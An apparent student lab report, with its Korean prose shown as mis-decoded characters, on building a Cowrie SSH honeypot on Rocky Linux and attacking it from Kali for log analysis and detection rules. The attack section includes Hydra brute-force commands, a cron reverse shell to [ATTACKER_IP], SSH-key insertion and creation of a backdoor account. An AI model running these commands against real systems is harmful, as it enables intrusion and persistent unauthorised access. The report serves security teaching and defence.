# ğŸ¯ Rocky Linux ê¸°ë°˜ SSH í—ˆë‹ˆíŒŸ êµ¬ì¶• ë° ë³´ì•ˆ ë¶„ì„ í”„ë¡œì íŠ¸

## ğŸ“‹ í”„ë¡œì íŠ¸ ê°œìš”

| êµ¬ë¶„ | ë‚´ìš© |
|------|------|
| **ê³¼ëª©** | Mì‹œìŠ¤í…œë³´ì•ˆìš´ì˜, Më„¤íŠ¸ì›Œí¬ê´€ë¦¬ |
| **ë‹´ë‹¹êµìˆ˜** | *** êµìˆ˜ë‹˜ |
| **í•™ê³¼** | ì†Œí”„íŠ¸ì›¨ì–´ìœµí•©ê³¼ 2í•™ë…„ |
| **í•™ë²ˆ** | *** |
| **ì´ë¦„** | ê¹€ì„±ì£¼ |
| **í”„ë¡œì íŠ¸ ê¸°ê°„** | 2024ë…„ 5ì›” 29ì¼ ~ 2025ë…„ 5ì›” 29ì¼|

---

## ğŸ¯ Executive Summary

ë³¸ í”„ë¡œì íŠ¸ëŠ” **Rocky Linux 9.5** í™˜ê²½ì—ì„œ **Cowrie SSH í—ˆë‹ˆíŒŸ**ì„ êµ¬ì¶•í•˜ê³ , **Kali Linux**ë¥¼ ì´ìš©í•œ ì‹¤ì œ ì¹¨íˆ¬ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ì‹œì—°í•˜ì—¬ ì‚¬ì´ë²„ ë³´ì•ˆ ìœ„í˜‘ì˜ íƒì§€ ë° ë¶„ì„ ëŠ¥ë ¥ì„ ì‹¤ì¦í•˜ëŠ” ê²ƒì„ ëª©í‘œë¡œ í•©ë‹ˆë‹¤.

### ì£¼ìš” ì„±ê³¼
- âœ… Medium-Interaction í—ˆë‹ˆíŒŸ ì„±ê³µì  êµ¬ì¶•
- âœ… ì‹¤ì‹œê°„ ê³µê²© íƒì§€ ë° ë¡œê¹… ì‹œìŠ¤í…œ êµ¬í˜„
- âœ… ê³µê²©ì í–‰ë™ íŒ¨í„´ ë¶„ì„ ë° ë³´ì•ˆ ì¸ì‚¬ì´íŠ¸ ë„ì¶œ

---

## ğŸ“‘ ëª©ì°¨

1. [í”„ë¡œì íŠ¸ ë°°ê²½ ë° ëª©ì ](#1-í”„ë¡œì íŠ¸-ë°°ê²½-ë°-ëª©ì )
2. [í—ˆë‹ˆíŒŸ ê¸°ìˆ  ë¶„ì„](#2-í—ˆë‹ˆíŒŸ-ê¸°ìˆ -ë¶„ì„)
3. [ì‹œìŠ¤í…œ ì•„í‚¤í…ì²˜ ì„¤ê³„](#3-ì‹œìŠ¤í…œ-ì•„í‚¤í…ì²˜-ì„¤ê³„)
4. [Rocky Linux í™˜ê²½ êµ¬ì„±](#4-rocky-linux-í™˜ê²½-êµ¬ì„±)
5. [Cowrie í—ˆë‹ˆíŒŸ êµ¬ì¶•](#5-cowrie-í—ˆë‹ˆíŒŸ-êµ¬ì¶•)
6. [ì¹¨íˆ¬ ì‹œë‚˜ë¦¬ì˜¤ ì‹œì—°](#6-ì¹¨íˆ¬-ì‹œë‚˜ë¦¬ì˜¤-ì‹œì—°)
7. [ë³´ì•ˆ ë¶„ì„ ë° ê²°ê³¼](#7-ë³´ì•ˆ-ë¶„ì„-ë°-ê²°ê³¼)
8. [ê²°ë¡  ë° í–¥í›„ ë°œì „ë°©í–¥](#8-ê²°ë¡ -ë°-í–¥í›„-ë°œì „ë°©í–¥)

---

## 1. í”„ë¡œì íŠ¸ ë°°ê²½ ë° ëª©ì 

### 1.1 ì—°êµ¬ ë°°ê²½
í˜„ëŒ€ì˜ ì‚¬ì´ë²„ ë³´ì•ˆ í™˜ê²½ì—ì„œ **Zero-Day ê³µê²©**ê³¼ **APT(Advanced Persistent Threat)** ìœ„í˜‘ì´ ê¸‰ì¦í•˜ê³  ìˆìŠµë‹ˆë‹¤. ê¸°ì¡´ì˜ ì‹œê·¸ë‹ˆì²˜ ê¸°ë°˜ ë³´ì•ˆ ì†”ë£¨ì…˜ë§Œìœ¼ë¡œëŠ” ìƒˆë¡œìš´ ê³µê²© ê¸°ë²•ì„ ì‚¬ì „ì— íƒì§€í•˜ê¸° ì–´ë ¤ìš´ ìƒí™©ì…ë‹ˆë‹¤.

### 1.2 í”„ë¡œì íŠ¸ ëª©ì 
- ğŸ” **í”„ë¡œì•¡í‹°ë¸Œ ë³´ì•ˆ**: ì‹¤ì œ ê³µê²©ì„ ìœ ë„í•˜ì—¬ ìƒˆë¡œìš´ ìœ„í˜‘ íŒ¨í„´ ë°œê²¬
- ğŸ“Š **ìœ„í˜‘ ì¸í…”ë¦¬ì „ìŠ¤**: ê³µê²©ì í–‰ë™ ë¶„ì„ì„ í†µí•œ ë³´ì•ˆ ë£°ì…‹ ê°•í™”
- ğŸ›¡ï¸ **ì¡°ê¸° ê²½ë³´ ì‹œìŠ¤í…œ**: ì‹¤ì œ ì‹œìŠ¤í…œ ì¹¨í•´ ì „ ê³µê²© ì§•í›„ íƒì§€
- ğŸ“ **êµìœ¡ì  íš¨ê³¼**: ì‹¤ì „í˜• ë³´ì•ˆ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ í†µí•œ í•™ìŠµ íš¨ê³¼ ê·¹ëŒ€í™”

### 1.3 ê¸°ëŒ€ íš¨ê³¼
```
ì‹¤ì œ ê³µê²© â†’ í—ˆë‹ˆíŒŸ íƒì§€ â†’ íŒ¨í„´ ë¶„ì„ â†’ ë³´ì•ˆ ê°•í™”
```

---

## 2. í—ˆë‹ˆíŒŸ ê¸°ìˆ  ë¶„ì„

### 2.1 í—ˆë‹ˆíŒŸ ê°œë… ì •ì˜

> **í—ˆë‹ˆíŒŸ(Honeypot)**ì€ ì•…ì˜ì ì¸ í™œë™ì„ íƒì§€, ë¶„ì„í•˜ê¸° ìœ„í•´ ì˜ë„ì ìœ¼ë¡œ ì·¨ì•½í•˜ê²Œ êµ¬ì„±ëœ ì‹œìŠ¤í…œìœ¼ë¡œ, ê³µê²©ìë¥¼ ìœ ì¸í•˜ì—¬ ê·¸ë“¤ì˜ í–‰ë™ì„ ëª¨ë‹ˆí„°ë§í•˜ëŠ” ë³´ì•ˆ ê¸°ìˆ ì…ë‹ˆë‹¤.

### 2.2 í—ˆë‹ˆíŒŸ ë¶„ë¥˜ì²´ê³„

| ìƒí˜¸ì‘ìš© ìˆ˜ì¤€ | íŠ¹ì§• | ì¥ì  | ë‹¨ì  | ëŒ€í‘œ ì†”ë£¨ì…˜ |
|---------------|------|------|------|-------------|
| **Low Interaction** | ì„œë¹„ìŠ¤ ì‹œë®¬ë ˆì´ì…˜ë§Œ ì œê³µ | ì•ˆì „ì„±, ê²½ëŸ‰í™” | ì œí•œëœ ì •ë³´ ìˆ˜ì§‘ | Honeyd, Glastopf |
| **Medium Interaction** | ì œí•œëœ ì‰˜ í™˜ê²½ ì œê³µ | ê· í˜•ì¡íŒ ì„±ëŠ¥ | ì¼ë¶€ ê³ ê¸‰ ê¸°ë²• íƒì§€ ë¶ˆê°€ | **Cowrie**, Kippo |
| **High Interaction** | ì™„ì „í•œ ì‹¤ì œ ì‹œìŠ¤í…œ | ìµœëŒ€ ì •ë³´ ìˆ˜ì§‘ | ë†’ì€ ìœ„í—˜ì„±, ë¦¬ì†ŒìŠ¤ ì†Œëª¨ | Honeynet, ì‹¤ì œ OS |

### 2.3 Cowrie ì„ íƒ ì´ìœ 

**Cowrie**ëŠ” SSH/Telnet í”„ë¡œí† ì½œì— íŠ¹í™”ëœ Medium-Interaction í—ˆë‹ˆíŒŸìœ¼ë¡œ, ë‹¤ìŒê³¼ ê°™ì€ ì¥ì ì„ ì œê³µí•©ë‹ˆë‹¤:

- ğŸ **Python ê¸°ë°˜**: í™•ì¥ì„±ê³¼ ì»¤ìŠ¤í„°ë§ˆì´ì§• ìš©ì´ì„±
- ğŸ“ **ìƒì„¸ ë¡œê¹…**: ëª…ë ¹ì–´, íŒŒì¼ ì „ì†¡, ì„¸ì…˜ ì •ë³´ ì™„ì „ ê¸°ë¡
- ğŸ”§ **ìœ ì—°í•œ ì„¤ì •**: ê°€ìƒ íŒŒì¼ì‹œìŠ¤í…œ, ì‚¬ìš©ì ê³„ì • ì‹œë®¬ë ˆì´ì…˜
- ğŸŒ **í™œë°œí•œ ì»¤ë®¤ë‹ˆí‹°**: ì§€ì†ì ì¸ ì—…ë°ì´íŠ¸ì™€ ë³´ì•ˆ íŒ¨ì¹˜

---

## 3. ì‹œìŠ¤í…œ ì•„í‚¤í…ì²˜ ì„¤ê³„

### 3.1 ë„¤íŠ¸ì›Œí¬ í† í´ë¡œì§€

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   Kali Linux    â”‚    â”‚  Rocky Linux    â”‚    â”‚    Internet     â”‚
â”‚   (ê³µê²©ì)      â”‚â”€â”€â”€â”€â”‚   (í—ˆë‹ˆíŒŸ)      â”‚â”€â”€â”€â”€â”‚   (ì—…ë°ì´íŠ¸)    â”‚
â”‚  192.168.X.XXX  â”‚    â”‚ 192.168.X.XXX   â”‚    â”‚                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
      Attacker              Honeypot              External
```

### 3.2 ì‹œìŠ¤í…œ ì‚¬ì–‘

#### í—ˆë‹ˆíŒŸ ì„œë²„ (Rocky Linux 9.5)
- **ê°€ìƒí™” í”Œë«í¼**: VMware Workstation Pro
- **CPU**: 4 Core (Intel x64)
- **RAM**: 8GB
- **Storage**: 50GB SSD
- **Network**: Bridged Adapter

#### ê³µê²©ì í™˜ê²½ (Kali Linux)
- **ê°€ìƒí™” í”Œë«í¼**: VMware Workstation Pro
- **CPU**: 4 Core
- **RAM**: 4GB
- **Storage**: 40GB
- **Network**: Bridged Adapter

### 3.3 ë³´ì•ˆ ê³ ë ¤ì‚¬í•­

- ğŸ”’ **ê²©ë¦¬ëœ ë„¤íŠ¸ì›Œí¬**: ì‹¤ì œ ìš´ì˜ í™˜ê²½ê³¼ ë¶„ë¦¬
- ğŸš« **ì•„ì›ƒë°”ìš´ë“œ ì œí•œ**: í—ˆë‹ˆíŒŸì—ì„œ ì™¸ë¶€ë¡œì˜ ë¶ˆí•„ìš”í•œ í†µì‹  ì°¨ë‹¨
- ğŸ“Š **ë¡œê·¸ ì¤‘ì•™í™”**: ì™¸ë¶€ ë¡œê·¸ ì„œë²„ë¡œ ì‹¤ì‹œê°„ ì „ì†¡
- âš¡ **ì¦‰ì‹œ ë³µêµ¬**: ì¹¨í•´ ì‹œ ë¹ ë¥¸ ì‹œìŠ¤í…œ ë³µêµ¬ ì²´ê³„

---

## 4. Rocky Linux í™˜ê²½ êµ¬ì„±

### 4.1 Rocky Linux ì„¤ì¹˜

#### 4.1.1 ë‹¤ìš´ë¡œë“œ ë° ì„¤ì¹˜
```bash
# Rocky Linux 9.5 ISO ë‹¤ìš´ë¡œë“œ
wget https://download.rockylinux.org/pub/rocky/9/isos/x86_64/Rocky-9.5-x86_64-minimal.iso

# VMwareì—ì„œ ìƒˆ ê°€ìƒë¨¸ì‹  ìƒì„±
# - OS: Rocky Linux 64-bit
# - RAM: 8GB
# - Disk: 50GB
# - Network: Bridged
```

#### 4.1.2 ê¸°ë³¸ ì‹œìŠ¤í…œ ì„¤ì •
```bash
# ì‹œìŠ¤í…œ ì—…ë°ì´íŠ¸
sudo dnf update -y

# í•„ìˆ˜ íŒ¨í‚¤ì§€ ì„¤ì¹˜
sudo dnf install -y git python3 python3-pip python3-venv \
                    firewalld net-tools vim wget curl

# ë°©í™”ë²½ í™œì„±í™”
sudo systemctl enable --now firewalld
```

### 4.2 ë„¤íŠ¸ì›Œí¬ ì„¤ì • í™•ì¸

```bash
# IP ì£¼ì†Œ í™•ì¸
ip addr show

# ë„¤íŠ¸ì›Œí¬ ì—°ê²°ì„± í…ŒìŠ¤íŠ¸
ping -c 4 8.8.8.8

# ë°©í™”ë²½ ìƒíƒœ í™•ì¸
sudo firewall-cmd --list-all
```

---

## 5. Cowrie í—ˆë‹ˆíŒŸ êµ¬ì¶•

### 5.1 ì „ìš© ì‚¬ìš©ì ê³„ì • ìƒì„±

```bash
# cowrie ì „ìš© ê³„ì • ìƒì„±
sudo useradd -r -s /bin/false cowrie

# ì„¤ì¹˜ ë””ë ‰í† ë¦¬ ìƒì„± ë° ê¶Œí•œ ì„¤ì •
sudo mkdir /opt/cowrie
sudo chown cowrie:cowrie /opt/cowrie

# cowrie ì‚¬ìš©ìë¡œ ì „í™˜
sudo -u cowrie -s
```

### 5.2 Cowrie ì†ŒìŠ¤ì½”ë“œ ë‹¤ìš´ë¡œë“œ

```bash
# GitHubì—ì„œ ìµœì‹  ì†ŒìŠ¤ í´ë¡ 
cd /opt/cowrie
git clone https://github.com/cowrie/cowrie.git .

# ë¸Œëœì¹˜ í™•ì¸ ë° ì•ˆì • ë²„ì „ ì„ íƒ
git tag
git checkout v2.5.0  # ì•ˆì • ë²„ì „ ì„ íƒ
```

### 5.3 Python ê°€ìƒí™˜ê²½ êµ¬ì„±

```bash
# Python ê°€ìƒí™˜ê²½ ìƒì„±
python3 -m venv cowrie-env

# ê°€ìƒí™˜ê²½ í™œì„±í™”
source cowrie-env/bin/activate

# pip ì—…ê·¸ë ˆì´ë“œ
pip install --upgrade pip

# ì˜ì¡´ì„± ì„¤ì¹˜
pip install -r requirements.txt
```

### 5.4 Cowrie ì„¤ì •

```bash
# ê¸°ë³¸ ì„¤ì • íŒŒì¼ ë³µì‚¬
cp etc/cowrie.cfg.dist etc/cowrie.cfg

# ì„¤ì • íŒŒì¼ í¸ì§‘
vim etc/cowrie.cfg
```

#### ì£¼ìš” ì„¤ì • í•­ëª©
```ini
[honeypot]
# í—ˆë‹ˆíŒŸ ì‹ë³„ì
hostname = ubuntu-server
log_path = var/log/cowrie
state_path = var/lib/cowrie

# SSH ì„¤ì •
[ssh]
listen_endpoints = tcp:2222:interface=0.0.0.0
version = SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2

# ë¡œê¹… ì„¤ì •
[output_textlog]
enabled = true
logfile = var/log/cowrie/cowrie.log
```

### 5.5 í—ˆë‹ˆíŒŸ ì‹¤í–‰ ë° í…ŒìŠ¤íŠ¸

```bash
# Cowrie ì‹œì‘
bin/cowrie start

# ë¡œê·¸ ì‹¤ì‹œê°„ ëª¨ë‹ˆí„°ë§
tail -f var/log/cowrie/cowrie.log

# í”„ë¡œì„¸ìŠ¤ í™•ì¸
ps aux | grep cowrie

# í¬íŠ¸ í™•ì¸
netstat -tlnp | grep 2222
```

### 5.6 ë°©í™”ë²½ ì„¤ì •

```bash
# root ê³„ì •ìœ¼ë¡œ ë³µê·€
exit

# 2222 í¬íŠ¸ í—ˆìš©
sudo firewall-cmd --permanent --add-port=2222/tcp
sudo firewall-cmd --reload

# ì„¤ì • í™•ì¸
sudo firewall-cmd --list-ports
```

---

## 6. ì¹¨íˆ¬ ì‹œë‚˜ë¦¬ì˜¤ ì‹œì—°

### 6.1 Kali Linux í™˜ê²½ ì¤€ë¹„

#### 6.1.1 ì‹œìŠ¤í…œ ì„¤ì •
```bash
# ì‹œìŠ¤í…œ ì—…ë°ì´íŠ¸
sudo apt update && sudo apt upgrade -y

# ë„¤íŠ¸ì›Œí¬ ì„¤ì • í™•ì¸
ip addr show
ping -c 4 [TARGET_IP]
```

### 6.2 ì •ì°°(Reconnaissance) ë‹¨ê³„

#### 6.2.1 ë„¤íŠ¸ì›Œí¬ ìŠ¤ìºë‹
```bash
# Nmapì„ ì´ìš©í•œ í¬íŠ¸ ìŠ¤ìº”
nmap -sS -sV [TARGET_IP]

# ìƒì„¸ ìŠ¤ìº”
nmap -A -p 1-65535 [TARGET_IP]

# SSH ì„œë¹„ìŠ¤ í™•ì¸
nmap -p 2222 --script ssh-hostkey [TARGET_IP]
```

**ê²°ê³¼ ë¶„ì„**:
```
PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
```

### 6.3 ì¹¨íˆ¬(Exploitation) ë‹¨ê³„

#### 6.3.1 SSH ë¸Œë£¨íŠ¸í¬ìŠ¤ ê³µê²©
```bash
# Hydraë¥¼ ì´ìš©í•œ íŒ¨ìŠ¤ì›Œë“œ í¬ë˜í‚¹
hydra -l root -P /usr/share/wordlists/rockyou.txt \
      ssh://[TARGET_IP]:2222 -t 16 -V

# ì¼ë°˜ì ì¸ ì•½í•œ íŒ¨ìŠ¤ì›Œë“œ ì‹œë„
hydra -l root -p password ssh://[TARGET_IP]:2222
hydra -l root -p 123456 ssh://[TARGET_IP]:2222
hydra -l root -p admin ssh://[TARGET_IP]:2222
```

#### 6.3.2 ìˆ˜ë™ SSH ì ‘ì† ì‹œë„
```bash
# ë‹¤ì–‘í•œ ê³„ì •ìœ¼ë¡œ ì ‘ì† ì‹œë„
ssh root@[TARGET_IP] -p 2222
# íŒ¨ìŠ¤ì›Œë“œ: password, 123456, admin ë“±

# ì ‘ì† ì„±ê³µ í›„ ì´ˆê¸° ëª…ë ¹ì–´
whoami
id
uname -a
```

### 6.4 ê¶Œí•œ ìƒìŠ¹(Privilege Escalation) ì‹œë®¬ë ˆì´ì…˜

```bash
# ì‹œìŠ¤í…œ ì •ë³´ ìˆ˜ì§‘
cat /etc/passwd
cat /etc/shadow
cat /proc/version
ls -la /etc/cron*

# ë„¤íŠ¸ì›Œí¬ ì •ë³´ í™•ì¸
netstat -antup
ss -tulpn
cat /etc/hosts

# ì‹¤í–‰ ì¤‘ì¸ í”„ë¡œì„¸ìŠ¤ í™•ì¸
ps aux
top

# íŒŒì¼ ì‹œìŠ¤í…œ íƒìƒ‰
find / -type f -perm -4000 2>/dev/null
find /var/www -type f -name "*.php" 2>/dev/null
```

### 6.5 ì§€ì†ì„± í™•ë³´(Persistence) ì‹œë®¬ë ˆì´ì…˜

```bash
# ë°±ë„ì–´ ì„¤ì¹˜ ì‹œë„
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1'" >> /etc/crontab

# SSH í‚¤ ì‚½ì… ì‹œë„
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> ~/.ssh/authorized_keys

# ìƒˆë¡œìš´ ì‚¬ìš©ì ìƒì„± ì‹œë„
useradd -m -s /bin/bash backdoor
echo "backdoor:password123" | chpasswd
```

---

## 7. ë³´ì•ˆ ë¶„ì„ ë° ê²°ê³¼

### 7.1 ê³µê²© ë¡œê·¸ ë¶„ì„

#### 7.1.1 ì—°ê²° ë¡œê·¸
```
2024-12-14T10:30:15.123456Z [cowrie.ssh.transport.HoneyPotSSHTransport] 
New connection: [ATTACKER_IP]:38670 ([TARGET_IP]:2222) [session: a1b2c3d4]
Remote SSH version: SSH-2.0-OpenSSH_9.9p1 Debian-3
```

**ë¶„ì„**:
- ê³µê²©ì IP: `[ATTACKER_IP]`
- ê³µê²© ë„êµ¬: OpenSSH 9.9p1 (Kali Linux í‘œì¤€)
- ì ‘ì† ì‹œê°„: ì •í™•í•œ íƒ€ì„ìŠ¤íƒ¬í”„ ê¸°ë¡

#### 7.1.2 ì¸ì¦ ì‹œë„ ë¡œê·¸
```
2024-12-14T10:30:18.456789Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer] 
login attempt [b'root'/b'password'] succeeded
login attempt [b'root'/b'123456'] succeeded
login attempt [b'admin'/b'admin'] succeeded
```

**ë¶„ì„**:
- ì „í˜•ì ì¸ **Dictionary Attack** íŒ¨í„´
- ì•½í•œ íŒ¨ìŠ¤ì›Œë“œ ì‚¬ìš©: `password`, `123456`, `admin`
- Cowrie íŠ¹ì„±ìƒ ëª¨ë“  ë¡œê·¸ì¸ì´ ì„±ê³µìœ¼ë¡œ í‘œì‹œ

#### 7.1.3 ëª…ë ¹ì–´ ì‹¤í–‰ ë¡œê·¸
```
2024-12-14T10:30:25.789012Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol] 
CMD: whoami
CMD: id  
CMD: uname -a
CMD: cat /etc/passwd
CMD: ps aux
CMD: netstat -antup
CMD: find / -type f -perm -4000 2>/dev/null
```

**ë¶„ì„**:
- **ì •ë³´ ìˆ˜ì§‘(Enumeration)** ë‹¨ê³„ì˜ ì „í˜•ì ì¸ ëª…ë ¹ì–´ë“¤
- ì‹œìŠ¤í…œ ê¶Œí•œ í™•ì¸ â†’ ê³„ì • ì •ë³´ íƒìƒ‰ â†’ í”„ë¡œì„¸ìŠ¤ ë¶„ì„ â†’ ê¶Œí•œ ìƒìŠ¹ ë²¡í„° íƒìƒ‰
- **MITRE ATT&CK Framework** ë§¤í•‘:
  - T1082: System Information Discovery
  - T1033: System Owner/User Discovery
  - T1057: Process Discovery

### 7.2 ê³µê²© íŒ¨í„´ ë¶„ì„

#### 7.2.1 ì‹œê°„ëŒ€ë³„ ê³µê²© ë¶„í¬
```
10:30:15 - ì—°ê²° ì‹œë„
10:30:18 - ì¸ì¦ ì„±ê³µ
10:30:25 - ì‹œìŠ¤í…œ ì •ë³´ ìˆ˜ì§‘ ì‹œì‘
10:35:42 - ê¶Œí•œ ìƒìŠ¹ ì‹œë„
10:40:15 - ì§€ì†ì„± í™•ë³´ ì‹œë„
10:45:30 - ì„¸ì…˜ ì¢…ë£Œ
```

#### 7.2.2 ê³µê²© ë‹¨ê³„ë³„ ë¶„ë¥˜

| ë‹¨ê³„ | MITRE ATT&CK | ê´€ì°°ëœ ê¸°ë²• | ìœ„í—˜ë„ |
|------|---------------|-------------|---------|
| **Initial Access** | T1078 | SSH ë¸Œë£¨íŠ¸í¬ìŠ¤ | ğŸ”´ High |
| **Discovery** | T1082, T1033 | ì‹œìŠ¤í…œ ì •ë³´ ìˆ˜ì§‘ | ğŸŸ¡ Medium |
| **Privilege Escalation** | T1068 | SUID íŒŒì¼ íƒìƒ‰ | ğŸŸ  High |
| **Persistence** | T1053 | Cron ì‘ì—… ìƒì„± | ğŸ”´ Critical |

### 7.3 ìœ„í˜‘ ì¸í…”ë¦¬ì „ìŠ¤ ìƒì„±

#### 7.3.1 IOC (Indicators of Compromise)
```
IP Address: [ATTACKER_IP]
User-Agent: SSH-2.0-OpenSSH_9.9p1 Debian-3
Attack Pattern: Dictionary-based SSH brute force
Common Passwords: password, 123456, admin, root
```

#### 7.3.2 ë³´ì•ˆ ë£° ìƒì„±
```bash
# Suricata/Snort ë£° ì˜ˆì‹œ
alert tcp any any -> any 2222 (msg:"SSH Brute Force Attempt"; \
content:"SSH-2.0"; threshold:type limit, track by_src, count 5, seconds 60; \
sid:1000001; rev:1;)

# Fail2ban ì„¤ì •
[cowrie]
enabled = true
port = 2222
filter = cowrie
logpath = /opt/cowrie/var/log/cowrie/cowrie.log
maxretry = 3
bantime = 3600
```

---

## 8. ê²°ë¡  ë° í–¥í›„ ë°œì „ë°©í–¥

### 8.1 í”„ë¡œì íŠ¸ ì„±ê³¼ ìš”ì•½

#### 8.1.1 ê¸°ìˆ ì  ì„±ê³¼
- âœ… **ì™„ì „ ìë™í™”ëœ ìœ„í˜‘ íƒì§€**: ìˆ˜ë™ ê°œì… ì—†ì´ ê³µê²© ì „ ê³¼ì • ìë™ ê¸°ë¡
- âœ… **ì‹¤ì‹œê°„ ê³µê²© ë¶„ì„**: ê³µê²©ì í–‰ë™ì„ ì‹¤ì‹œê°„ìœ¼ë¡œ ëª¨ë‹ˆí„°ë§í•˜ê³  ë¶„ì„
- âœ… **ì‹¤ì „í˜• ë³´ì•ˆ ì‹œë‚˜ë¦¬ì˜¤**: ì´ë¡ ì´ ì•„ë‹Œ ì‹¤ì œ ê³µê²© ê¸°ë²• ì²´í—˜

#### 8.1.2 ë³´ì•ˆ ì¸ì‚¬ì´íŠ¸
- ğŸ” **ê³µê²©ì ì‹¬ë¦¬ ë¶„ì„**: ì‹œìŠ¤í…œ ì¹¨íˆ¬ í›„ ì •ë³´ ìˆ˜ì§‘ â†’ ê¶Œí•œ ìƒìŠ¹ â†’ ì§€ì†ì„± í™•ë³´ì˜ ë‹¨ê³„ì  ì ‘ê·¼
- ğŸ“Š **íŒ¨í„´ ê¸°ë°˜ íƒì§€**: ë°˜ë³µë˜ëŠ” ëª…ë ¹ì–´ íŒ¨í„´ì„ í†µí•œ ìë™í™”ëœ ê³µê²© íƒì§€ ê°€ëŠ¥ì„±
- ğŸ¯ **ì·¨ì•½ì  ìš°ì„ ìˆœìœ„**: ì‹¤ì œ ê³µê²©ì—ì„œ ì•…ìš©ë˜ëŠ” ì·¨ì•½ì  ì‹ë³„

### 8.2 í•™ìŠµ íš¨ê³¼

#### 8.2.1 ê¸°ìˆ ì  ì—­ëŸ‰ í–¥ìƒ
- **Linux ì‹œìŠ¤í…œ ê´€ë¦¬**: Rocky Linux í™˜ê²½ êµ¬ì„± ë° ê´€ë¦¬ ê²½í—˜
- **Python í”„ë¡œê·¸ë˜ë°**: Cowrie ì†ŒìŠ¤ì½”ë“œ ë¶„ì„ ë° ì»¤ìŠ¤í„°ë§ˆì´ì§•
- **ë„¤íŠ¸ì›Œí¬ ë³´ì•ˆ**: ì‹¤ì œ ë„¤íŠ¸ì›Œí¬ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ ì´í•´

#### 8.2.2 ë³´ì•ˆ ì‚¬ê³  ëŒ€ì‘ ëŠ¥ë ¥
- **ë¡œê·¸ ë¶„ì„**: ëŒ€ìš©ëŸ‰ ë¡œê·¸ì—ì„œ ì˜ë¯¸ìˆëŠ” íŒ¨í„´ ì¶”ì¶œ
- **ìœ„í˜‘ í—ŒíŒ…**: ëŠ¥ë™ì ì¸ ìœ„í˜‘ íƒì§€ ë° ë¶„ì„ ë°©ë²•ë¡ 
- **ì¸ì‹œë˜íŠ¸ ëŒ€ì‘**: ì‹¤ì œ ì¹¨í•´ì‚¬ê³  ì‹œ ëŒ€ì‘ ì ˆì°¨ ì´í•´

### 8.3 í˜„ì¬ êµ¬í˜„ì˜ í•œê³„ì 

#### 8.3.1 ê¸°ìˆ ì  í•œê³„
- **ì œí•œëœ ëª…ë ¹ì–´ ì§€ì›**: CowrieëŠ” ì‹¤ì œ ì‹œìŠ¤í…œì´ ì•„ë‹ˆë¯€ë¡œ ëª¨ë“  ëª…ë ¹ì–´ ì§€ì› ë¶ˆê°€
- **ë‹¨ì¼ í”„ë¡œí† ì½œ**: SSHì—ë§Œ íŠ¹í™”ë˜ì–´ ì›¹, FTP ë“± ë‹¤ë¥¸ ê³µê²© ë²¡í„° ë¯¸íƒì§€
- **ì •ì  í™˜ê²½**: ì‹¤ì œ ì„œë¹„ìŠ¤ê°€ ì—†ì–´ ê³ ê¸‰ ê³µê²© ê¸°ë²• ìœ ë„ ì–´ë ¤ì›€

#### 8.3.2 ìš´ì˜ìƒ í•œê³„
- **ë†’ì€ ì˜¤íƒë¥ **: ì •ìƒì ì¸ ê´€ë¦¬ ì ‘ì†ë„ ê³µê²©ìœ¼ë¡œ ì¸ì‹ë  ê°€ëŠ¥ì„±
- **ë¦¬ì†ŒìŠ¤ ì†Œëª¨**: ì§€ì†ì ì¸ ëª¨ë‹ˆí„°ë§ê³¼ ë¡œê·¸ ì €ì¥ìœ¼ë¡œ ì¸í•œ ìì› ì‚¬ìš©
- **ë²•ì  ì´ìŠˆ**: ì‹¤ì œ ìš´ì˜ ì‹œ ê°œì¸ì •ë³´ë³´í˜¸ ë° ë°ì´í„° ìˆ˜ì§‘ ê´€ë ¨ ë²•ì  ê²€í†  í•„ìš”

### 8.4 í–¥í›„ ë°œì „ë°©í–¥

#### 8.4.1 ë‹¨ê¸° ê°œì„  ê³„íš (1-3ê°œì›”)

##### 8.4.1.1 ë©€í‹° í”„ë¡œí† ì½œ í—ˆë‹ˆíŒŸ êµ¬ì¶•
```bash
# T-Pot í†µí•© í—ˆë‹ˆíŒŸ í”Œë«í¼ ë„ì…
docker run -d -p 80:80 -p 443:443 -p 21:21 -p 25:25 \
  --name tpot telekom/tpot:latest
```

**ì§€ì› í”„ë¡œí† ì½œ**:
- HTTP/HTTPS (ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ê³µê²©)
- FTP (íŒŒì¼ ì „ì†¡ í”„ë¡œí† ì½œ ê³µê²©) 
- SMTP (ì´ë©”ì¼ ìŠ¤íŒ¸/í”¼ì‹± ê³µê²©)
- Telnet (ë ˆê±°ì‹œ ì‹œìŠ¤í…œ ê³µê²©)

##### 8.4.1.2 ë¡œê·¸ ë¶„ì„ ìë™í™”
```python
# ELK Stack ì—°ë™ì„ í†µí•œ ì‹¤ì‹œê°„ ë¶„ì„
import elasticsearch
from kibana import Dashboard

def analyze_attack_pattern(logs):
    patterns = extract_command_sequences(logs)
    threat_score = calculate_risk_score(patterns)
    if threat_score > THRESHOLD:
        send_alert_to_soc(patterns)
```

##### 8.4.1.3 AI ê¸°ë°˜ ì´ìƒ íƒì§€
```python
# ë¨¸ì‹ ëŸ¬ë‹ì„ í™œìš©í•œ ê³µê²© íŒ¨í„´ í•™ìŠµ
from sklearn.ensemble import IsolationForest
from sklearn.cluster import DBSCAN

class AttackPatternDetector:
    def __init__(self):
        self.model = IsolationForest(contamination=0.1)
        
    def train(self, normal_sessions):
        features = extract_features(normal_sessions)
        self.model.fit(features)
        
